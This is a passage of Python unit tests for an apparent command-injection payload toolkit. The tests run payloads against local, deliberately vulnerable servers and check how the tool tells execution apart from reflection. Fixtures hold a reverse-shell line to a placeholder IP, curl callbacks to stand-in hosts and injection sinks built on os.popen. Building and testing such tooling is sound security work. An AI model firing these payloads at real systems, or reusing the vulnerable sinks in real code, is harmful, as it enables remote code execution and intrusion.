            time_files = list(outdir.glob("*-time.yaml"))
            if time_files:
                time_text = "\n".join(t.read_text() for t in time_files)
                self.assertIn("duration>=6", time_text)
                self.assertNotIn("tail -f", time_text)


    def test_verify_confirms_execution_against_local_target(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = os.popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the harness must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_timing_oracle_requires_a_reproducible_delay(self):
        # A blocking/timing payload is only "confirmed" when the delay clears the
        # noise margin AND reproduces on the re-fire; a one-off spike is jitter.
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=8.1)
        self.assertEqual(confirmed, "confirmed")
        # First request was slow but the delay did not reproduce -> not execution.
        jitter, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=1.2)
        self.assertEqual(jitter, "no-delay")
        # Below the margin at all -> not a delay.
        quick, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=1.5, baseline=1.0, margin=2.0, elapsed_confirm=None)
        self.assertEqual(quick, "no-delay")

    def test_reflection_oracle_rejects_signature_present_without_payload(self):
        # The command-output signature confirms execution only when it is absent
        # from the payload-free control response.
        rec = make_record(payload="; id", match=r"uid=\d+", expected_channel="response")
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="welcome home")
        self.assertEqual(confirmed, "confirmed")
        # Same signature already in the baseline response -> not proof of execution.
        inconclusive, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="debug: uid=0(root) always shown")
        self.assertEqual(inconclusive, "inconclusive")

    def test_verify_marks_always_reflected_signature_inconclusive(self):
        # End-to-end: a target that echoes the signature regardless of input must
        # not be reported as a confirmed RCE.
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                # Signature present for every request, payload or not.
                self.wfile.write(b"uid=0(root) gid=0(root) groups=0(root)")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            id_results = [r for r in results if r["payload"] == "; id"]
            self.assertTrue(id_results)
            self.assertEqual(id_results[0]["verdict"], "inconclusive")
            self.assertFalse(any(r["verdict"] == "confirmed" for r in results),
                             "a signature echoed regardless of payload must not confirm")
        finally:
            server.shutdown()
            server.server_close()

    def test_encode_for_location(self):
        # Each injection point gets its own on-the-wire encoding.
        self.assertEqual(self.gen._encode_for_location("; id", "query_value"), "%3B%20id")
        self.assertEqual(self.gen._encode_for_location("; id", "url_path"), "%3B%20id")
        self.assertEqual(self.gen._encode_for_location("; id", "form_value"), "%3B+id")
        # A JSON string body is escaped only — never percent-encoded.
        self.assertEqual(self.gen._encode_for_location("; id", "json_string"), "; id")
        self.assertEqual(self.gen._encode_for_location('a"b\\c', "json_string"), 'a\\"b\\\\c')
        # Headers stay on one line.
        self.assertEqual(self.gen._encode_for_location("a\r\nb", "header"), "a  b")
        self.assertEqual(self.gen._encode_for_location("; id", "raw"), "; id")
        with self.assertRaises(ValueError):
            self.gen._encode_for_location("x", "bogus")

    def test_detect_body_location(self):
        # Body shape drives the default...
        self.assertEqual(self.gen._detect_body_location('{"host": "FUZZ"}', []), "json_string")
        self.assertEqual(self.gen._detect_body_location('host=FUZZ&x=1', []), "form_value")
        self.assertEqual(self.gen._detect_body_location('FUZZ', []), "raw")
        # ...and an explicit Content-Type wins over the shape.
        self.assertEqual(
            self.gen._detect_body_location('FUZZ', ["Content-Type: application/json"]), "json_string")
        self.assertEqual(
            self.gen._detect_body_location('FUZZ', ["Content-Type: application/x-www-form-urlencoded"]),
            "form_value")

    def test_build_verify_request_encodes_per_injection_point(self):
        # The URL marker is percent-encoded (server URL-decodes it back)...
        target, body, hdrs = self.gen._build_verify_request(
            "; id", url="http://t/?x=FUZZ", data=None, headers=None,
            url_location="query_value", body_location="raw")
        self.assertEqual(target, "http://t/?x=%3B%20id")
        # ...while a JSON body is escaped, NOT percent-encoded: the old blanket
        # URL-encoding handed the sink a literal "%3B%20id" and broke every JSON
        # injection. Regression guard for that bug.
        _, body, _ = self.gen._build_verify_request(
            "; id", url="http://t/api", data='{"host": "FUZZ"}', headers=None,
            url_location="query_value", body_location="json_string")
        self.assertEqual(body, b'{"host": "; id"}')
        self.assertNotIn(b"%3B", body)
        # Headers carry the payload verbatim on a single line.
        _, _, hdrs = self.gen._build_verify_request(
            "; id", url="http://t/", data=None, headers=["X-Fuzz: FUZZ"],
            url_location="query_value", body_location="raw")
        self.assertEqual(hdrs["X-Fuzz"], "; id")

    def test_verify_confirms_execution_in_json_body(self):
        # End-to-end regression: a JSON-body command-injection sink must be
        # confirmed. With the old blanket URL-encoding the sink received
        # "%3B%20id" and nothing ever executed.
        import http.server
        import json as _json
        import os
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(length).decode(errors="replace")
                try:
                    host = _json.loads(raw).get("host", "")
                except Exception:
                    host = ""
                pipe = os.popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/api", method="POST",
                data='{"host": "FUZZ"}',
                headers=["Content-Type: application/json"],
            )
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "a JSON-body RCE must be confirmed")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_canary_oracle_rejects_reflected_token(self):
        # The same-token control disambiguates reflection from execution.
        rec = make_record(payload="echo DETECTION_ABC123", token="ABC123",
                          match=r"ABC123", expected_channel="response")
        # Token in the response AND in the inert same-token control -> the target
        # echoes input, so the match is not proof of execution.
        reflected, _ = self.gen._evaluate_verify(
            rec, 200, "you sent: echo DETECTION_ABC123", elapsed=0.1, baseline=0.1,
            control_body="you sent: rcekit-control-ABC123")
        self.assertEqual(reflected, "inconclusive")
        # Token in the response but absent from the inert control -> execution.
        executed, _ = self.gen._evaluate_verify(
            rec, 200, "DETECTION_ABC123", elapsed=0.1, baseline=0.1,
            control_body="(command not found)")
        self.assertEqual(executed, "confirmed")

    def _run_detection_echo_verify(self, handler_cls):
        import socketserver
        import threading

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), handler_cls)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = [
                r for r in self.gen.generate_payload_records(
                    mode="detection", selected_environments=["unix"],
                    selected_contexts=["raw"], selected_encodings=["none"])
                if r.payload.startswith("echo DETECTION_")
            ]
            self.assertTrue(records, "expected a canary detection payload")
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ")
            return [r for r in results if r["payload"].startswith("echo DETECTION_")]
        finally:
            server.shutdown()
            server.server_close()

    def test_verify_canary_inconclusive_against_reflecting_target(self):
        # A target that echoes input back returns the canary without executing
        # anything, so it must never be reported as confirmed execution.
        import http.server
        import urllib.parse as up

        class Reflect(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(host.encode(errors="replace"))  # reflect, do NOT execute

        echoed = self._run_detection_echo_verify(Reflect)
        self.assertTrue(echoed)
        self.assertEqual(echoed[0]["verdict"], "inconclusive")
        self.assertFalse(any(r["verdict"] == "confirmed" for r in echoed),
                         "a reflected canary must not confirm execution")

    def test_verify_canary_confirmed_against_executing_target(self):
        # A target that actually runs the input yields the canary only for the
        # executing payload, not for the inert same-token control -> confirmed.
        import http.server
        import os
        import urllib.parse as up

        class Execute(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = os.popen(host + " 2>/dev/null")  # runs the input directly
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        executed = self._run_detection_echo_verify(Execute)
        self.assertTrue(executed)
        self.assertEqual(executed[0]["verdict"], "confirmed")

    def test_expected_delay_ms_is_runtime_aware(self):
        cases = [
            ("sleep 5", "unix", 5000),
            ("sleep 2", "docker", 2000),
            ("sleep 1", "ruby", 1000),
            ("timeout /T 5", "windows", 5000),
            ("Start-Sleep -Seconds 3", "powershell", 3000),
            ("Start-Sleep -Milliseconds 500", "powershell", 500),
            ("import time; time.sleep(2)", "python", 2000),
            ("__import__('time').sleep(1)", "python", 1000),
            ("Thread.sleep(2000)", "java", 2000),
            ("System.Threading.Thread.Sleep(2000)", "dotnet", 2000),
            ("select(undef, undef, undef, 1)", "perl", 1000),
            ("time.Sleep(1 * time.Second)", "go", 1000),
            ("SELECT pg_sleep(1)", "sql", 1000),
            ("setTimeout(()=>console.log('x'), 1000)", "nodejs", 1000),
            ("echo DETECTION_ABC", "unix", None),  # not a sleep
        ]
        for payload, env, expected in cases:
            self.assertEqual(self.gen._expected_delay_ms(payload, env), expected,
                             f"{payload!r} @ {env}")

    def test_generated_blocking_record_carries_expected_delay(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            include_blocking=True))
        sleeps = [r for r in records if r.payload == "sleep 5"]
        self.assertTrue(sleeps, "the blocking 'sleep 5' detection payload should be present")
        self.assertTrue(sleeps[0].blocking)
        self.assertEqual(sleeps[0].expected_delay_ms, 5000)
        # A non-blocking payload leaves the field unset.
        echoes = [r for r in records if r.payload.startswith("echo DETECTION_")]
        self.assertTrue(echoes)
        self.assertIsNone(echoes[0].expected_delay_ms)

    def test_oob_pending_survives_a_timed_out_delivery(self):
        # An OOB payload is confirmed out-of-band, so a timed-out delivery
        # request (status=None) must stay oob-pending, not become a flat error.
        rec = make_record(payload="; curl http://x/", expected_channel="interactsh", token="TOK")
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "timed out", elapsed=8.0, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "oob-pending")

    def test_timing_timeout_is_a_candidate_not_an_error(self):
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        # Hung past the timeout for at least the margin -> the hang may be the
        # sleep itself, so surface it as a candidate rather than a flat error.
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "timed out", elapsed=6.0, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "timing-candidate-on-timeout")
        # A short hang that never cleared the margin is just an error.
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "boom", elapsed=1.2, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "error")

    def test_verify_confirms_subsecond_sleep_via_expected_delay(self):
        # A 1s sleep — impossible to confirm under the old flat 2s floor — is
        # confirmed once the threshold adapts to the payload's expected delay.
        import http.server
        import socketserver
        import threading
        import time as _time
        import urllib.parse as up

        class Sleeper(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                if "sleep" in host:
                    _time.sleep(1.0)  # the injected 1s sleep executes here
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sleeper)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = [make_record(payload="; sleep 1", expected_channel="timing",
                                   blocking=True, expected_delay_ms=1000)]
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ")
            self.assertEqual(results[0]["verdict"], "confirmed")
        finally:
            server.shutdown()
            server.server_close()

    def test_build_verification_plan(self):
        recs = [
            make_record(payload="; id", category="basic_enum", safety="safe"),
            make_record(payload="; id", category="basic_enum", safety="safe"),  # duplicate
            make_record(payload="bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                        category="reverse_shells", safety="intrusive"),
            make_record(payload="; curl http://tok.oob.example/", category="oob",
                        safety="intrusive", expected_channel="interactsh",
                        token="tok", oob_host="tok.oob.example"),
        ]
        lines, to_send = rcekit.build_verification_plan(
            recs, "GET", "http://t/?x=FUZZ",
            attacker_ip="192.168.1.100", attacker_domain="attacker.com")
        self.assertEqual(len(to_send), 3, "duplicate payloads collapse")
        text = "\n".join(lines)
        self.assertIn("3 unique payloads", text)
        self.assertIn("HIGH-IMPACT", text)
        self.assertIn("reverse_shells", text)
        self.assertIn("192.168.1.100", text)          # reverse-shell callback host
        self.assertIn("oob.example", text)            # OOB callback domain
        # --max-payloads caps what will be sent.
        _, capped = rcekit.build_verification_plan(recs, "GET", "u", max_payloads=1)
        self.assertEqual(len(capped), 1)


    def test_interleave_round_robins_buckets(self):
        recs = ([make_record(payload=f"u{i}", environment="unix") for i in range(3)]
                + [make_record(payload=f"w{i}", environment="windows") for i in range(2)])
        out = list(RCEKit._interleave(recs, key=lambda r: r.environment))
        self.assertEqual(len(out), 5)
        # The first two span both buckets instead of exhausting 'unix' first.
        self.assertEqual(out[0].environment, "unix")
        self.assertEqual(out[1].environment, "windows")

    def test_shared_payload_keeps_per_environment_provenance(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix", "windows"],
            selected_contexts=["raw"], selected_encodings=["none"]))
        whoami_envs = {r.environment for r in records if r.payload == "whoami"}
        # A command shared across environments keeps a record for each, not just
        # whichever emitted it first.
        self.assertIn("unix", whoami_envs)
        self.assertIn("windows", whoami_envs)

    def test_max_payloads_samples_across_buckets(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "c.jsonl"
            self.gen.save_payloads_to_file(
                file_path=str(out), max_payloads=30, output_format="jsonl",
                selected_encodings=["none"])
            rows = [json.loads(line) for line in out.read_text().splitlines() if line.strip()]
            self.assertLessEqual(len(rows), 30)
            self.assertGreater(len({r["category"] for r in rows}), 1,
                               "a capped run must span more than one category")
            self.assertGreater(len({r["environment"] for r in rows}), 1,
                               "a capped run must span more than one environment")

    def test_text_output_has_no_duplicate_lines(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "c.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="text",
                selected_categories=["basic_enum"],
                selected_environments=["unix", "windows"],
                selected_contexts=["raw"], selected_encodings=["none"])
            lines = [line for line in out.read_text().splitlines() if line.strip()]
            self.assertTrue(lines)
            self.assertEqual(len(lines), len(set(lines)),
                             "the text wordlist must not repeat payload lines")


class VerifySafeByDefaultTestCase(unittest.TestCase):
    """The CLI must not fire high-impact payloads at a target by default."""

    def _serve(self):
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _ok(self):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = _ok
            do_POST = _ok

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server, port

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_reverse_shells_are_held_back_by_default(self):
        server, port = self._serve()
        try:
            url = f"http://127.0.0.1:{port}/?x=FUZZ"
            # Default: reverse shells are 'intrusive', so nothing is fired.
            safe = self._run("--acknowledge-consent", "--categories", "reverse_shells",
                             "--environments", "unix", "--verify-url", url)
            self.assertEqual(safe.returncode, 0, safe.stderr)
            self.assertIn("0 unique payloads to send", safe.stdout)
            self.assertIn("--verify-active-risk intrusive", safe.stdout)
            # Opt in: now they are included and the plan flags the high-impact set.
            active = self._run("--acknowledge-consent", "--categories", "reverse_shells",
                               "--environments", "unix", "--verify-active-risk", "intrusive",
                               "--max-payloads", "15", "--verify-url", url)
            self.assertEqual(active.returncode, 0, active.stderr)
            self.assertIn("HIGH-IMPACT", active.stdout)
            self.assertIn("reverse_shells", active.stdout)
            self.assertIn("192.168.1.100", active.stdout)  # reverse-shell callback host
            self.assertNotIn("0 unique payloads to send", active.stdout)
        finally:
            server.shutdown()
            server.server_close()


class DoctorTestCase(unittest.TestCase):
    """Corpus integrity check and hard-fail on a missing/empty corpus."""

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_check_integrity_ok_on_shipped_corpus(self):
        ok, report = RCEKit().check_integrity()
        self.assertTrue(ok)
        self.assertTrue(any("corpus loaded and parsed" in line for line in report))

    def test_check_integrity_fails_on_missing_corpus(self):
        gen = RCEKit(template_path=Path("/no/such/corpus.json"))
        ok, report = gen.check_integrity()
        self.assertFalse(ok)
        self.assertTrue(any("FAIL" in line for line in report))
        self.assertFalse(gen.corpus_ready("exploit")[0])
        self.assertFalse(gen.corpus_ready("detection")[0])

    def test_corpus_ready_is_mode_aware(self):
        with tempfile.TemporaryDirectory() as tmp:
            tf = Path(tmp) / "only_detection.json"
            tf.write_text(json.dumps(
                {"detection_payloads": {"unix": ["echo DETECTION_{canary}"]}}))
            gen = RCEKit(template_path=tf)
            self.assertTrue(gen.corpus_ready("detection")[0])
            self.assertFalse(gen.corpus_ready("exploit")[0])  # no exploit categories

    def test_doctor_cli_exit_codes(self):
        good = self._run("--doctor")
        self.assertEqual(good.returncode, 0)
        self.assertIn("[doctor] OK", good.stdout)
        bad = self._run("--doctor", "--template-file", "/no/such/corpus.json")
        self.assertEqual(bad.returncode, 1)
        self.assertIn("PROBLEMS FOUND", bad.stdout)

    def test_run_hard_fails_on_missing_corpus(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            res = self._run("--detection-only", "--template-file", "/no/such/corpus.json",
                            "-o", str(out))
            self.assertEqual(res.returncode, 1)
            self.assertIn("Refusing to run", res.stdout)
            self.assertFalse(out.exists())


class NewSinkCoverageTestCase(unittest.TestCase):
    """Sinks added from the real-world Vulhub evaluation. Each new payload must
    carry the right machine-readable oracle so verification can confirm it."""

    def setUp(self):
        self.gen = RCEKit()

    def test_exec_ast_python_sink_confirms_via_command_oracle(self):
        # Langflow-class sink: exec() of AST function-defs runs decorators and
        # default-arg expressions. Payloads are function definitions; the existing
        # command oracles must still attach.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        exec_ast = [r for r in records if r.sink == "exec_ast"]
        self.assertTrue(exec_ast, "exec_ast sink must emit payloads")
        self.assertTrue(all(("def " in r.payload or "@" in r.payload) for r in exec_ast))
        self.assertTrue(any(r.match == r"uid=\d+" for r in exec_ast))
        self.assertTrue(any(r.match and "root:" in r.match for r in exec_ast))

    def test_expression_template_nodejs_sink_present_with_oracle(self):
        # n8n-class sink: server-side {{ }} expression evaluation with a sandbox
        # escape reaching child_process.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["nodejs"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        expr = [r for r in records if r.sink == "expression_template"]
        self.assertTrue(expr, "expression_template sink must emit payloads")
        self.assertTrue(any("this.process" in r.payload for r in expr))
        self.assertTrue(any(r.match == r"uid=\d+" for r in expr))

    def test_psql_meta_command_sink_carries_cr_bypass_and_oracle(self):
        # pgAdmin-class sink: psql \! meta-command with a CR (\r) validator bypass.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["postgres"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        psql = [r for r in records if r.sink == "psql_meta_command"]
        self.assertTrue(psql, "psql_meta_command sink must emit payloads")
        self.assertTrue(any("\r" in r.payload and "\\!" in r.payload for r in psql),
                        "a CR-separated \\! bypass variant must be present")
        self.assertTrue(any(r.match == r"uid=\d+" for r in psql))

    def test_math_canary_is_a_unique_product_not_49(self):
        # The fixed 7*7=49 signature collides with any '49' on the page; the {math}
        # canary must expand to a random product with a matching unique oracle.
        seen_products = set()
        for _ in range(5):
            gen = RCEKit()
            records = list(gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["python"],
                selected_contexts=["raw"], selected_encodings=["none"],
            ))
            # The canary is a multi-digit product ({{ 1234*5678 }}); match it
            # precisely so it is never confused with the fixed {{7*7}} probe.
            math = [r for r in records
                    if re.fullmatch(r"\{\{\s*\d{3,}\*\d{3,}\s*\}\}", r.payload.strip())]
            self.assertTrue(math, "a {math} canary payload must be emitted")
            for r in math:
                m = re.search(r"(\d+)\*(\d+)", r.payload)
                product = int(m.group(1)) * int(m.group(2))
                self.assertRegex(str(product), r.match)
                self.assertNotEqual(product, 49)
                seen_products.add(product)
        self.assertGreater(len(seen_products), 1, "products must be randomized per run")


class EncodedOracleTestCase(unittest.TestCase):
    """O5: the confirmation oracle must see through common output wrappers so a
    sink that base64/hex/url/unicode-encodes command output is still confirmed."""

    def setUp(self):
        self.gen = RCEKit()

    def test_matches_output_through_common_wrappers(self):
        import base64
        out = "uid=0(root) gid=0(root)"
        pat = r"uid=\d+"
        self.assertTrue(self.gen._encoded_search(pat, out))
        self.assertTrue(self.gen._encoded_search(pat, "b64:" + base64.b64encode(out.encode()).decode()))
        self.assertTrue(self.gen._encoded_search(pat, "hex=" + out.encode().hex()))
        self.assertTrue(self.gen._encoded_search(pat, "q=uid%3D0%28root%29"))

    def test_no_false_positive_on_benign_body(self):
        self.assertFalse(self.gen._encoded_search(r"uid=\d+", "welcome — 49 documents processed"))


class VerifyChainTestCase(unittest.TestCase):
    """O2: the session-aware multi-step chain runner reaches sinks a single
    stateless request cannot — confirming in-band (match oracle) and out-of-band
    (a {callback} URL received by the built-in listener)."""

    def setUp(self):
        self.gen = RCEKit()

    @staticmethod
    def _free_port():
        import socket
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def test_chain_confirms_in_band_via_multi_step_flow(self):
        import http.server, socketserver, threading, re as _re, urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):  # token page whose value a later step must reuse
                self.send_response(200); self.end_headers()
                self.wfile.write(b"session TOKEN=abc123 ready")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                cmd = up.parse_qs(body).get("cmd", [""])[0]
                pipe = os.popen("echo " + cmd + " 2>&1")  # command injection sink
                out = pipe.read(); pipe.close()
                self.send_response(200); self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            chain = {
                "base": f"http://127.0.0.1:{port}",
                "confirm_step": "run",
                "steps": [
                    {"name": "tok", "method": "GET", "path": "/session",
                     "extract": {"tok": r"TOKEN=(\w+)"}},
                    {"name": "run", "method": "POST", "path": "/run",
                     "form": {"session": "{tok}", "cmd": "FUZZ"}},
                ],
            }
            records = list(self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"]))
            results = self.gen.run_verification_chain(records, chain)
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the chain must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown(); server.server_close()

    def test_chain_confirms_out_of_band_via_builtin_listener(self):
        import http.server, socketserver, threading, re as _re, urllib.request

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                # Simulate blind execution: the "command" fetches the callback URL.
                m = _re.search(r"https?://\S+", body)
                if m:
                    try:
                        urllib.request.urlopen(m.group(0).strip("'\""), timeout=3).read()
                    except Exception:
                        pass
                self.send_response(200); self.end_headers(); self.wfile.write(b"queued")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        listen_port = self._free_port()
        try:
            chain = {
                "base": f"http://127.0.0.1:{port}",
                "callback_host": "127.0.0.1",
                "listen_port": listen_port,
                "steps": [
                    {"name": "exec", "method": "POST", "path": "/exec", "body": "cmd=FUZZ"},
                ],
            }
            rec = make_record(payload="run {callback}", category="oob",
                              expected_channel="response", match=None)
            results = self.gen.run_verification_chain([rec], chain)
            self.assertEqual(results[0]["verdict"], "confirmed")
            self.assertIn("callback", results[0]["detail"])
        finally:
            server.shutdown(); server.server_close()


class DetectionMethodTestCase(unittest.TestCase):
    """Phase 1 — the ReflectedMath detection method and the method-driven engine.

    The confirmation invariant: a ``confirmed`` verdict requires a value the
    target *computed* (arithmetic on random operands), never a literal the
    payload already carried. Proven end-to-end against a live ``/vuln`` sink
    that executes vs a ``/reflect`` sink that only echoes — the direct
    false-positive-resistance gate from the design brief.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.method = ReflectedMath(self.gen)

    def test_build_probes_carry_a_computed_expected_value(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probes = self.method.build_probes(rec, _random.Random(1))
        self.assertTrue(probes)
        for probe in probes:
            # The expected value is a sum the payload never spells out literally,
            # so only execution can put it in the response.
            self.assertNotIn(probe.expected, probe.payload)
            # `forbidden` is the un-executed literal, which IS in the payload;
            # its survival in a response means reflection, not execution.
            self.assertIsNotNone(probe.forbidden)
            self.assertIn(probe.forbidden, probe.payload)

    def test_windows_probe_uses_cmd_arithmetic(self):
        import random as _random
        rec = make_record(environment="windows", context="raw")
        probes = self.method.build_probes(rec, _random.Random(1))
        self.assertTrue(probes)
        self.assertIn("set /a", probes[0].payload)

    def test_confirm_distinguishes_execution_reflection_and_control(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(7))[0]
        # Execution: the computed value is present, the literal is gone.
        exec_body = f"output: {probe.expected} done"
        self.assertEqual(
            self.method.confirm(Observation(200, exec_body, control_body="idle"), probe).status,
            "confirmed")
        # Reflection: the target echoes the payload; the sum is never produced.
        self.assertEqual(
            self.method.confirm(Observation(200, probe.payload, control_body="idle"), probe).status,
            "negative")
        # Value also present without the payload -> not attributable to execution.
        self.assertEqual(
            self.method.confirm(Observation(200, exec_body, control_body=exec_body), probe).status,
            "inconclusive")

    def test_confirm_holds_when_target_also_echoes_the_payload(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(9))[0]
        # The computed value AND the raw expression are both present — the classic
        # command-injection sink that echoes the input (e.g. "PING <input>") while
        # also executing it. The computed value is unforgeable proof of execution,
        # so this must stay `confirmed`; the reflection is only noted.
        body = f"{probe.expected} but also {probe.forbidden}"
        verdict = self.method.confirm(Observation(200, body, control_body="idle"), probe)
        self.assertEqual(verdict.status, "confirmed")
        self.assertIn("reflects the payload verbatim", verdict.evidence)

    def test_sink_raw_omits_leading_separator(self):
        # A sink that runs the injected input as the *whole* command (e.g. a
        # qx/$input/ backdoor) has no surrounding command to break out of, so a
        # leading `;` would be a shell syntax error. `--sink-raw` must send the
        # shell probes as bare commands while keeping the computed-value invariant.
        import random as _random
        rec = make_record(environment="unix", context="raw")
        default_probe = ReflectedMath(self.gen).build_probes(rec, _random.Random(3))[0]
        self.assertTrue(default_probe.payload.startswith("; "))
